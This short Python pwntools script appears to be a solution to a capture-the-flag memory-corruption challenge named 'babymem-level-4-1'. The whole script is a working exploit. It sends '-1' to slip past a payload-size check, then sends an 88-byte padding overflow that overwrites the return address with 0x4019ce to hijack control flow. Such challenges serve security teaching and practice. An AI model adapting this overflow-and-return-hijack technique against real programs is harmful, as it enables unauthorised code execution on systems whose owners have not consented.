from pwn import *;

proc = process('/challenge/babymem-level-4-1')
proc.recv()
# max payload size 55 -> -1 to bypass control
proc.sendline(b'-1')

proc.recv()
# offset 88 to RET
payload = b'A' * 88 + p64(0x4019ce)
proc.sendline(payload)
print(proc.recv())

